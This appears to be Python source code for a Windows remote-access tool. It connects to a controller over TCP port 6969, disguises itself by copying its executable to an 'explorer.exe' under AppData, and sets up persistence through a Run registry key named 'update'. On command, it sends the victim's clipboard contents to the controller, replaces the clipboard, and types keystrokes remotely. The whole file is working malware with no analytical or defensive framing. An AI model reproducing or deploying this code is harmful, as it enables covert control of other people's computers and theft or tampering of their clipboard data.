import socket
import keyboard
import win32clipboard
from colorama import Fore
import sys, os
import shutil
import subprocess
import re, time

try:
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((socket.gethostbyname(socket.gethostname()), 6969))
except Exception:
    sys.exit()
brackets = f"{Fore.BLUE}[{Fore.GREEN}+{Fore.BLUE}]{Fore.RESET}"

def persistence():
    storage_location = os.environ["appdata"] + "\\Windows\\explorer.exe"
    if not os.path.exists(storage_location):
        os.mkdir(os.environ["appdata"] + "\\Windows\\")
        # for .py file
        # shutil.copyfile(__file__, storage_location)
        # for .exe file
        shutil.copyfile(sys.executable, storage_location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d"' + storage_location + '"', shell=True)


def get_clipboard_data():
    win32clipboard.OpenClipboard()
    try:
        data = win32clipboard.GetClipboardData()
    except TypeError:
        data = "Couldn't get clipboard data"
    win32clipboard.CloseClipboard()
    return data

def set_clipboard_data(text):
    win32clipboard.OpenClipboard()
    win32clipboard.EmptyClipboard()
    win32clipboard.SetClipboardText(text)
    win32clipboard.CloseClipboard()

def press_key(key):
    try:
        keyboard.press_and_release(key)
        conn.send(f"{brackets} Pressed key {key}".encode())
    except ValueError:
        keys = list(key)
        for key in keys:
            keyboard.press_and_release(key)
        conn.send(f"{brackets} Pressed key chain {keys}".encode())

while True:
    key = conn.recv(3024).decode()
    if key == 'pexit':
        conn.send(f"\n{brackets} Connection Closed.\n".encode())
        conn.close()
        exit()
    elif key == 'clipboard_data':
        data = get_clipboard_data()
        conn.send(f"\n{brackets} Clipboard: {data}\n".encode())
    elif key.startswith('copy'):
        text_to_copy = key.split("~~~")[-1]
        set_clipboard_data(text_to_copy)
        conn.send(f"{brackets} Copied {text_to_copy}!!".encode())

    else:
        if "{{" in key and "}}" in key:
            # abcd{{2}}wasd
            key_set_1 = key.split('{{')[0]
            key_set_2 = key.split('}}')[-1]
            try:
                interval = re.search(r"\{{([0-9_]+)\}}", key).group(1)
            except AttributeError:
                conn.send(f"\n{brackets} Error parsing interval\n".encode())

            press_key(key_set_1)
            time.sleep(int(interval))
            press_key(key_set_2)
        else:
            press_key(key)

conn.close()